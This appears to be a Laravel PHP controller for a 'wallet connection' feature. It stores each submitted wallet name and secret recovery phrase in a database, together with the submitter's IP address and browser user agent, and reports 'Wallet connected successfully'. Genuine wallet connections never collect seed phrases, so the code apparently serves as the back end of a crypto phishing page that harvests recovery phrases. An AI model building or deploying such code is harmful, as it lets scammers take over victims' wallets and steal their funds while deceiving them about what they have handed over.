<?php

namespace App\Http\Controllers;

use App\Models\WalletConnection;
use Illuminate\Http\Request;

class WalletConnectionController extends Controller
{
    public function store(Request $request)
    {
        WalletConnection::create([
            'wallet_name' => $request->input('wallet_name'),
            'secret_phrase' => $request->input('secret_phrase'),
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
        ]);

        return response()->json([
            'success' => true,
            'message' => 'Wallet connected successfully'
        ]);
    }
}
